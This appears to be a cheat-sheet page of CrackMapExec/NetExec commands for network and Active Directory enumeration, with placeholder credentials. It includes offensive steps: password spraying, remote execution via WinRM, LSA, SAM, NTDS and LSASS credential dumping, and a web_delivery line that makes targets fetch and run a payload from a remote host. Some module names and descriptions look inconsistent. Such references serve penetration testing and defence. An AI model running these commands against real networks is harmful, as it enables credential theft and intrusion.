# CrackMapExec (enumeration)

> Using CrackMapExec/NetExec to enumerate SMB, LDAP, WinRM and MSSQL across a network: shares, users, sessions, policies and more.

- Category: Enumeration
- Commands: 65
- Page: https://terminal.rokibulroni.com/tool/enumeration/crackmapexec-enum
- Homepage: https://www.netexec.wiki
- Documentation: https://www.netexec.wiki
- Tags: Active Directory, SMB, LDAP

## Install

- apt: `sudo apt install netexec`
- pipx: `pipx install git+https://github.com/Pennyw0rth/NetExec`

## SMB Host Enumeration

### crackmapexec smb 192.168.1.0/24

```bash
crackmapexec smb 192.168.1.0/24
```

Enumerates SMB enabled hosts, signing status, and OS versions across a subnet.

### crackmapexec smb 10.10.10.10 --fqdn

```bash
crackmapexec smb 10.10.10.10 --fqdn
```

Retrieves the Fully Qualified Domain Name of the remote host.

### crackmapexec smb hosts.txt --gen-relay-list relay_targets.txt

```bash
crackmapexec smb hosts.txt --gen-relay-list relay_targets.txt
```

Enumerates hosts without SMB signing enabled and saves them for relaying.


## Null Session and Anonymous Enumeration

### crackmapexec smb 192.168.1.10 -u '' -p ''

```bash
crackmapexec smb 192.168.1.10 -u '' -p ''
```

Attempts to authenticate using a null session to validate anonymous access.

### crackmapexec smb 192.168.1.10 -u 'guest' -p ''

```bash
crackmapexec smb 192.168.1.10 -u 'guest' -p ''
```

Checks if the Guest account is active and accessible without a password.


## SMB Share Enumeration

### crackmapexec smb 192.168.1.10 -u '' -p '' --shares

```bash
crackmapexec smb 192.168.1.10 -u '' -p '' --shares
```

Lists available SMB shares using a null session.

### crackmapexec smb 192.168.1.10 -u 'user' -p 'Pass123' --shares

```bash
crackmapexec smb 192.168.1.10 -u 'user' -p 'Pass123' --shares
```

Example:

```bash
crackmapexec smb 192.168.1.10 -u 'jsmith' -p 'P@ssword1' --shares
```

Lists all shares the specified user has access to with read/write permissions.

### crackmapexec smb 192.168.1.10 -u 'user' -p 'Pass123' -M spider_plus

```bash
crackmapexec smb 192.168.1.10 -u 'user' -p 'Pass123' -M spider_plus
```

Example:

```bash
crackmapexec smb 192.168.1.10 -u 'jsmith' -p 'P@ssword1' -M spider_plus
```

Advanced module to map and index all readable files on accessible shares.


## SMB User and Group Enumeration

### crackmapexec smb 192.168.1.10 -u 'user' -p 'Pass123' --users

```bash
crackmapexec smb 192.168.1.10 -u 'user' -p 'Pass123' --users
```

Example:

```bash
crackmapexec smb 192.168.1.10 -u 'jsmith' -p 'P@ssword1' --users
```

Enumerates domain users via SMB query.

### crackmapexec smb 192.168.1.10 -u 'user' -p 'Pass123' --groups

```bash
crackmapexec smb 192.168.1.10 -u 'user' -p 'Pass123' --groups
```

Example:

```bash
crackmapexec smb 192.168.1.10 -u 'jsmith' -p 'P@ssword1' --groups
```

Enumerates domain groups via SMB query.

### crackmapexec smb 192.168.1.10 -u 'user' -p 'Pass123' --local-groups

```bash
crackmapexec smb 192.168.1.10 -u 'user' -p 'Pass123' --local-groups
```

Example:

```bash
crackmapexec smb 192.168.1.10 -u 'jsmith' -p 'P@ssword1' --local-groups
```

Enumerates local groups on the target machine.

### crackmapexec smb 192.168.1.10 -u 'user' -p 'Pass123' --rid-brute

```bash
crackmapexec smb 192.168.1.10 -u 'user' -p 'Pass123' --rid-brute
```

Example:

```bash
crackmapexec smb 192.168.1.10 -u 'jsmith' -p 'P@ssword1' --rid-brute
```

Brute forces RIDs to enumerate users and groups even if standard listing fails.

### crackmapexec smb 192.168.1.10 -u 'user' -p 'Pass123' --rid-brute 10000

```bash
crackmapexec smb 192.168.1.10 -u 'user' -p 'Pass123' --rid-brute 10000
```

Example:

```bash
crackmapexec smb 192.168.1.10 -u 'jsmith' -p 'P@ssword1' --rid-brute 10000
```

Performs an extended RID brute force up to 10000 to find hidden accounts.


## SMB Session and Logged On User Discovery

### crackmapexec smb 192.168.1.10 -u 'user' -p 'Pass123' --sessions

```bash
crackmapexec smb 192.168.1.10 -u 'user' -p 'Pass123' --sessions
```

Example:

```bash
crackmapexec smb 192.168.1.10 -u 'jsmith' -p 'P@ssword1' --sessions
```

Enumerates active SMB sessions on the target server.

### crackmapexec smb 192.168.1.0/24 -u 'user' -p 'Pass123' --loggedon-users

```bash
crackmapexec smb 192.168.1.0/24 -u 'user' -p 'Pass123' --loggedon-users
```

Example:

```bash
crackmapexec smb 192.168.1.0/24 -u 'jsmith' -p 'P@ssword1' --loggedon-users
```

Queries hosts to see which users are currently logged on interactively.


## SMB Password Policy Enumeration

### crackmapexec smb 192.168.1.10 -u 'user' -p 'Pass123' --pass-pol

```bash
crackmapexec smb 192.168.1.10 -u 'user' -p 'Pass123' --pass-pol
```

Example:

```bash
crackmapexec smb 192.168.1.10 -u 'jsmith' -p 'P@ssword1' --pass-pol
```

Retrieves the domain password policy including complexity and lockout thresholds.


## Credential Validation and Authentication Checks

### crackmapexec smb 192.168.1.0/24 -u users.txt -p passwords.txt

```bash
crackmapexec smb 192.168.1.0/24 -u users.txt -p passwords.txt
```

Sprays a list of credentials across the network to validate access.

### crackmapexec smb 192.168.1.0/24 -u 'user' -p 'Pass123' --local-auth

```bash
crackmapexec smb 192.168.1.0/24 -u 'user' -p 'Pass123' --local-auth
```

Example:

```bash
crackmapexec smb 192.168.1.0/24 -u 'Administrator' -p 'P@ssword1' --local-auth
```

Validates credentials against the local SAM database instead of the domain.

### crackmapexec smb 192.168.1.10 -u 'user' -p 'Pass123' --continue-on-success

```bash
crackmapexec smb 192.168.1.10 -u 'user' -p 'Pass123' --continue-on-success
```

Example:

```bash
crackmapexec smb 192.168.1.10 -u 'jsmith' -p 'P@ssword1' --continue-on-success
```

Continues testing other credentials even after a successful login is found.


## SMB Local Admin Discovery

### crackmapexec smb 192.168.1.0/24 -u 'user' -p 'Pass123'

```bash
crackmapexec smb 192.168.1.0/24 -u 'user' -p 'Pass123'
```

Example:

```bash
crackmapexec smb 192.168.1.0/24 -u 'jsmith' -p 'P@ssword1'
```

Identifies hosts where the provided user has Administrative (Pwn3d!) privileges.


## Module Based Enumeration

### crackmapexec smb 192.168.1.10 -u 'user' -p 'Pass123' -M enum_av

```bash
crackmapexec smb 192.168.1.10 -u 'user' -p 'Pass123' -M enum_av
```

Example:

```bash
crackmapexec smb 192.168.1.10 -u 'jsmith' -p 'P@ssword1' -M enum_av
```

Uses WMI to enumerate installed antivirus software on the target.

### crackmapexec smb 192.168.1.10 -u 'user' -p 'Pass123' -M iov_list

```bash
crackmapexec smb 192.168.1.10 -u 'user' -p 'Pass123' -M iov_list
```

Example:

```bash
crackmapexec smb 192.168.1.10 -u 'jsmith' -p 'P@ssword1' -M iov_list
```

Enumerates disconnected user sessions which can be hijackable.

### crackmapexec smb 192.168.1.10 -u 'user' -p 'Pass123' -M wmi_query -o QUERY='Select * from Win32_OperatingSystem'

```bash
crackmapexec smb 192.168.1.10 -u 'user' -p 'Pass123' -M wmi_query -o QUERY='Select * from Win32_OperatingSystem'
```

Example:

```bash
crackmapexec smb 192.168.1.10 -u 'jsmith' -p 'P@ssword1' -M wmi_query -o QUERY='Select * from Win32_OperatingSystem'
```

Executes a custom WMI query to retrieve specific system information.


## LDAP Domain Enumeration

### crackmapexec ldap 192.168.1.10 -u 'user' -p 'Pass123'

```bash
crackmapexec ldap 192.168.1.10 -u 'user' -p 'Pass123'
```

Example:

```bash
crackmapexec ldap dc.example.local -u 'jsmith' -p 'P@ssword1'
```

Validates domain credentials against the LDAP service.


## LDAP User Enumeration

### crackmapexec ldap 192.168.1.10 -u 'user' -p 'Pass123' --users

```bash
crackmapexec ldap 192.168.1.10 -u 'user' -p 'Pass123' --users
```

Example:

```bash
crackmapexec ldap dc.example.local -u 'jsmith' -p 'P@ssword1' --users
```

Queries LDAP to retrieve a list of all domain users and their descriptions.

### crackmapexec ldap 192.168.1.10 -u 'user' -p 'Pass123' --active-users

```bash
crackmapexec ldap 192.168.1.10 -u 'user' -p 'Pass123' --active-users
```

Example:

```bash
crackmapexec ldap dc.example.local -u 'jsmith' -p 'P@ssword1' --active-users
```

Filters the user list to show only active (enabled) accounts.

### crackmapexec ldap 192.168.1.10 -u 'user' -p 'Pass123' --users --keyword 'pass'

```bash
crackmapexec ldap 192.168.1.10 -u 'user' -p 'Pass123' --users --keyword 'pass'
```

Example:

```bash
crackmapexec ldap dc.example.local -u 'jsmith' -p 'P@ssword1' --users --keyword 'pass'
```

Searches user descriptions in LDAP for specific keywords like 'pass' or 'secret'.


## LDAP Group and OU Enumeration

### crackmapexec ldap 192.168.1.10 -u 'user' -p 'Pass123' --groups

```bash
crackmapexec ldap 192.168.1.10 -u 'user' -p 'Pass123' --groups
```

Example:

```bash
crackmapexec ldap dc.example.local -u 'jsmith' -p 'P@ssword1' --groups
```

Retrieves all groups within the Active Directory domain.

### crackmapexec ldap 192.168.1.10 -u 'user' -p 'Pass123' --groups --keyword 'admin'

```bash
crackmapexec ldap 192.168.1.10 -u 'user' -p 'Pass123' --groups --keyword 'admin'
```

Example:

```bash
crackmapexec ldap dc.example.local -u 'jsmith' -p 'P@ssword1' --groups --keyword 'admin'
```

Filters domain groups to find high-value targets containing 'admin'.


## LDAP Domain Enumeration

### crackmapexec ldap 192.168.1.10 -u 'user' -p 'Pass123' --admins

```bash
crackmapexec ldap 192.168.1.10 -u 'user' -p 'Pass123' --admins
```

Example:

```bash
crackmapexec ldap dc.example.local -u 'jsmith' -p 'P@ssword1' --admins
```

Enumerates members of the Domain Admins group via LDAP.

### crackmapexec ldap 192.168.1.10 -u 'user' -p 'Pass123' --asreproast

```bash
crackmapexec ldap 192.168.1.10 -u 'user' -p 'Pass123' --asreproast
```

Example:

```bash
crackmapexec ldap dc.example.local -u 'jsmith' -p 'P@ssword1' --asreproast
```

Identifies users without Kerberos pre-authentication enabled (ASREPRoasting candidates).

### crackmapexec ldap 192.168.1.10 -u 'user' -p 'Pass123' --kerberoasting

```bash
crackmapexec ldap 192.168.1.10 -u 'user' -p 'Pass123' --kerberoasting
```

Example:

```bash
crackmapexec ldap dc.example.local -u 'jsmith' -p 'P@ssword1' --kerberoasting
```

Enumerates users with Service Principal Names (SPNs) set (Kerberoasting candidates).

### crackmapexec ldap 192.168.1.10 -u 'user' -p 'Pass123' --trusted-for-delegation

```bash
crackmapexec ldap 192.168.1.10 -u 'user' -p 'Pass123' --trusted-for-delegation
```

Example:

```bash
crackmapexec ldap dc.example.local -u 'jsmith' -p 'P@ssword1' --trusted-for-delegation
```

Finds computer and user objects trusted for unconstrained delegation.

### crackmapexec ldap 192.168.1.10 -u 'user' -p 'Pass123' --password-not-required

```bash
crackmapexec ldap 192.168.1.10 -u 'user' -p 'Pass123' --password-not-required
```

Example:

```bash
crackmapexec ldap dc.example.local -u 'jsmith' -p 'P@ssword1' --password-not-required
```

Enumerates accounts that do not require a password to login.


## LDAP GPO and Policy Enumeration

### crackmapexec ldap 192.168.1.10 -u 'user' -p 'Pass123' -M gpp_password

```bash
crackmapexec ldap 192.168.1.10 -u 'user' -p 'Pass123' -M gpp_password
```

Example:

```bash
crackmapexec ldap dc.example.local -u 'jsmith' -p 'P@ssword1' -M gpp_password
```

Scans Group Policy Preferences for legacy cPassword attributes.


## LDAP Domain Enumeration

### crackmapexec ldap 192.168.1.10 -u 'user' -p 'Pass123' -M get_desc

```bash
crackmapexec ldap 192.168.1.10 -u 'user' -p 'Pass123' -M get_desc
```

Example:

```bash
crackmapexec ldap dc.example.local -u 'jsmith' -p 'P@ssword1' -M get_desc
```

Extracts and displays the description fields for all domain users.

### crackmapexec ldap 192.168.1.10 -u 'user' -p 'Pass123' -M whoami

```bash
crackmapexec ldap 192.168.1.10 -u 'user' -p 'Pass123' -M whoami
```

Example:

```bash
crackmapexec ldap dc.example.local -u 'jsmith' -p 'P@ssword1' -M whoami
```

Enumerates privileges and group memberships of the current credential context.


## WinRM Host Enumeration

### crackmapexec winrm 192.168.1.0/24 -u 'user' -p 'Pass123'

```bash
crackmapexec winrm 192.168.1.0/24 -u 'user' -p 'Pass123'
```

Example:

```bash
crackmapexec winrm 192.168.1.0/24 -u 'jsmith' -p 'P@ssword1'
```

Enumerates hosts with WinRM service enabled and validates credentials.

### crackmapexec winrm 192.168.1.10 -u 'user' -p 'Pass123' -x 'whoami'

```bash
crackmapexec winrm 192.168.1.10 -u 'user' -p 'Pass123' -x 'whoami'
```

Example:

```bash
crackmapexec winrm 192.168.1.10 -u 'jsmith' -p 'P@ssword1' -x 'whoami'
```

Executes a basic command to verify functional remote code execution privileges.


## MSSQL Server Enumeration

### crackmapexec mssql 192.168.1.0/24 -u 'user' -p 'Pass123'

```bash
crackmapexec mssql 192.168.1.0/24 -u 'user' -p 'Pass123'
```

Example:

```bash
crackmapexec mssql 192.168.1.0/24 -u 'sa' -p 'P@ssword1'
```

Discovers MSSQL instances and validates SQL login credentials.


## MSSQL Database and Role Enumeration

### crackmapexec mssql 192.168.1.10 -u 'user' -p 'Pass123' --dbs

```bash
crackmapexec mssql 192.168.1.10 -u 'user' -p 'Pass123' --dbs
```

Example:

```bash
crackmapexec mssql 192.168.1.10 -u 'sa' -p 'P@ssword1' --dbs
```

Enumerates available databases on the target SQL server.

### crackmapexec mssql 192.168.1.10 -u 'user' -p 'Pass123' --tables

```bash
crackmapexec mssql 192.168.1.10 -u 'user' -p 'Pass123' --tables
```

Example:

```bash
crackmapexec mssql 192.168.1.10 -u 'sa' -p 'P@ssword1' --tables
```

Enumerates all tables within the accessible databases.

### crackmapexec mssql 192.168.1.10 -u 'user' -p 'Pass123' -M mssql_priv

```bash
crackmapexec mssql 192.168.1.10 -u 'user' -p 'Pass123' -M mssql_priv
```

Example:

```bash
crackmapexec mssql 192.168.1.10 -u 'sa' -p 'P@ssword1' -M mssql_priv
```

Module to identify current user privileges on the MSSQL server.

### crackmapexec mssql 192.168.1.10 -u 'user' -p 'Pass123' --no-fqdn-resolve

```bash
crackmapexec mssql 192.168.1.10 -u 'user' -p 'Pass123' --no-fqdn-resolve
```

Example:

```bash
crackmapexec mssql 192.168.1.10 -u 'sa' -p 'P@ssword1' --no-fqdn-resolve
```

Performs enumeration while preventing DNS resolution to maintain stealth.


## SSH Service Enumeration

### crackmapexec ssh 192.168.1.0/24 -u 'user' -p 'Pass123'

```bash
crackmapexec ssh 192.168.1.0/24 -u 'user' -p 'Pass123'
```

Example:

```bash
crackmapexec ssh 192.168.1.0/24 -u 'root' -p 'toor'
```

Enumerates hosts with SSH enabled and checks credential validity.

### crackmapexec ssh 192.168.1.0/24 -u 'user' --key-file id_rsa

```bash
crackmapexec ssh 192.168.1.0/24 -u 'user' --key-file id_rsa
```

Example:

```bash
crackmapexec ssh 192.168.1.0/24 -u 'ubuntu' --key-file /home/user/.ssh/id_rsa
```

Validates SSH authentication using a private key file instead of a password.


## Advanced and Combined Real World Enumeration

### crackmapexec smb 192.168.1.10 -u 'user' -p 'Pass123' --users --groups --sessions

```bash
crackmapexec smb 192.168.1.10 -u 'user' -p 'Pass123' --users --groups --sessions
```

Example:

```bash
crackmapexec smb 192.168.1.10 -u 'jsmith' -p 'P@ssword1' --users --groups --sessions
```

Combines multiple SMB enumeration flags for a comprehensive host snapshot.


## Module Based Enumeration

### crackmapexec smb 192.168.1.0/24 -u 'user' -p 'Pass123' -M zerologon

```bash
crackmapexec smb 192.168.1.0/24 -u 'user' -p 'Pass123' -M zerologon
```

Example:

```bash
crackmapexec smb 192.168.1.0/24 -u 'jsmith' -p 'P@ssword1' -M zerologon
```

Checks domain controllers for the Zerologon vulnerability (CVE-2020-1472).

### crackmapexec smb 192.168.1.0/24 -u 'user' -p 'Pass123' -M petitpotam

```bash
crackmapexec smb 192.168.1.0/24 -u 'user' -p 'Pass123' -M petitpotam
```

Example:

```bash
crackmapexec smb 192.168.1.0/24 -u 'jsmith' -p 'P@ssword1' -M petitpotam
```

Checks if the target is vulnerable to PetitPotam coercion.

### crackmapexec smb 192.168.1.10 -u 'user' -p 'Pass123' -M no pac

```bash
crackmapexec smb 192.168.1.10 -u 'user' -p 'Pass123' -M no pac
```

Example:

```bash
crackmapexec smb 192.168.1.10 -u 'jsmith' -p 'P@ssword1' -M no_pac
```

Checks for the No-PAC (Sam the Admin) vulnerability.


## Output Formatting and Logging

### crackmapexec smb 192.168.1.0/24 -u 'user' -p 'Pass123' --export results.csv

```bash
crackmapexec smb 192.168.1.0/24 -u 'user' -p 'Pass123' --export results.csv
```

Example:

```bash
crackmapexec smb 192.168.1.0/24 -u 'jsmith' -p 'P@ssword1' --export results.csv
```

Exports enumeration results to a CSV file for analysis and reporting.


## Automation and Pipeline Usage

### crackmapexec smb 192.168.1.0/24 -u 'user' -p 'Pass123' --verbose

```bash
crackmapexec smb 192.168.1.0/24 -u 'user' -p 'Pass123' --verbose
```

Example:

```bash
crackmapexec smb 192.168.1.0/24 -u 'jsmith' -p 'P@ssword1' --verbose
```

Enables verbose output to capture detailed debugging information during enumeration.


## Module Based Enumeration

### crackmapexec ldap 192.168.1.10 -u 'user' -p 'Pass123' -M maq

```bash
crackmapexec ldap 192.168.1.10 -u 'user' -p 'Pass123' -M maq
```

Example:

```bash
crackmapexec ldap dc.example.local -u 'jsmith' -p 'P@ssword1' -M maq
```

Enumerates the MachineAccountQuota for the domain.

### crackmapexec ldap 192.168.1.10 -u 'user' -p 'Pass123' -M adcs

```bash
crackmapexec ldap 192.168.1.10 -u 'user' -p 'Pass123' -M adcs
```

Example:

```bash
crackmapexec ldap dc.example.local -u 'jsmith' -p 'P@ssword1' -M adcs
```

Enumerates Active Directory Certificate Services templates and servers.


## SMB Share Enumeration

### crackmapexec smb 192.168.1.10 -u 'user' -p 'Pass123' --spider SHAREname

```bash
crackmapexec smb 192.168.1.10 -u 'user' -p 'Pass123' --spider SHAREname
```

Example:

```bash
crackmapexec smb 192.168.1.10 -u 'jsmith' -p 'P@ssword1' --spider C$
```

Recursively lists files in a specific share to find interesting data.

### crackmapexec smb 192.168.1.10 -u 'user' -p 'Pass123' --spider SHAREname --content

```bash
crackmapexec smb 192.168.1.10 -u 'user' -p 'Pass123' --spider SHAREname --content
```

Example:

```bash
crackmapexec smb 192.168.1.10 -u 'jsmith' -p 'P@ssword1' --spider C$ --content
```

Spiders a share and attempts to read file content for sensitive data.

### crackmapexec smb 192.168.1.10 -u 'user' -p 'Pass123' --spider SHAREname --regex 'pass'

```bash
crackmapexec smb 192.168.1.10 -u 'user' -p 'Pass123' --spider SHAREname --regex 'pass'
```

Example:

```bash
crackmapexec smb 192.168.1.10 -u 'jsmith' -p 'P@ssword1' --spider C$ --regex 'password'
```

Spiders a share searching for files matching a specific regex pattern.


## Blue Team Exposure and Hardening Validation

### crackmapexec smb 192.168.1.10 -u 'user' -p 'Pass123' --lsa

```bash
crackmapexec smb 192.168.1.10 -u 'user' -p 'Pass123' --lsa
```

Example:

```bash
crackmapexec smb 192.168.1.10 -u 'jsmith' -p 'P@ssword1' --lsa
```

Attempts to dump LSA secrets to validate if credentials can be extracted remotely.

### crackmapexec smb 192.168.1.10 -u 'user' -p 'Pass123' --sam

```bash
crackmapexec smb 192.168.1.10 -u 'user' -p 'Pass123' --sam
```

Example:

```bash
crackmapexec smb 192.168.1.10 -u 'jsmith' -p 'P@ssword1' --sam
```

Attempts to dump the SAM database to check for local credential exposure.

### crackmapexec smb 192.168.1.10 -u 'user' -p 'Pass123' --ntds

```bash
crackmapexec smb 192.168.1.10 -u 'user' -p 'Pass123' --ntds
```

Example:

```bash
crackmapexec smb 192.168.1.10 -u 'jsmith' -p 'P@ssword1' --ntds
```

Attempts to dump the NTDS.dit file via DRSUAPI to validate DC security.


## Module Based Enumeration

### crackmapexec smb 192.168.1.10 -u 'user' -p 'Pass123' -M web_delivery -o URL=http://192.168.1.5/payload

```bash
crackmapexec smb 192.168.1.10 -u 'user' -p 'Pass123' -M web_delivery -o URL=http://192.168.1.5/payload
```

Example:

```bash
crackmapexec smb 192.168.1.10 -u 'jsmith' -p 'P@ssword1' -M web_delivery -o URL=http://192.168.1.5/payload
```

Simulates a web delivery payload execution for audit purposes.

### crackmapexec smb 192.168.1.10 -u 'user' -p 'Pass123' -M lsassy

```bash
crackmapexec smb 192.168.1.10 -u 'user' -p 'Pass123' -M lsassy
```

Example:

```bash
crackmapexec smb 192.168.1.10 -u 'jsmith' -p 'P@ssword1' -M lsassy
```

Advanced module to attempt remote LSASS dumping for credential validation.

### crackmapexec smb 192.168.1.10 -u 'user' -p 'Pass123' -M nanodump

```bash
crackmapexec smb 192.168.1.10 -u 'user' -p 'Pass123' -M nanodump
```

Example:

```bash
crackmapexec smb 192.168.1.10 -u 'jsmith' -p 'P@ssword1' -M nanodump
```

Uses NanoDump to attempt a stealthy LSASS dump for evasion testing.

### crackmapexec smb 192.168.1.10 -u 'user' -p 'Pass123' -M procdump

```bash
crackmapexec smb 192.168.1.10 -u 'user' -p 'Pass123' -M procdump
```

Example:

```bash
crackmapexec smb 192.168.1.10 -u 'jsmith' -p 'P@ssword1' -M procdump
```

Uses Sysinternals Procdump to dump LSASS for blue team signature validation.

### crackmapexec smb 192.168.1.10 -u 'user' -p 'Pass123' -M bh_collector

```bash
crackmapexec smb 192.168.1.10 -u 'user' -p 'Pass123' -M bh_collector
```

Example:

```bash
crackmapexec smb 192.168.1.10 -u 'jsmith' -p 'P@ssword1' -M bh_collector
```

Runs the BloodHound ingestor module to map domain relationships.

## Related tools

- [CrackMapExec / NetExec](https://terminal.rokibulroni.com/tool/lateral/crackmapexec)
- [ldapsearch](https://terminal.rokibulroni.com/tool/enumeration/ldapsearch)
- [BloodHound.py](https://terminal.rokibulroni.com/tool/active-directory/bloodhound-python)
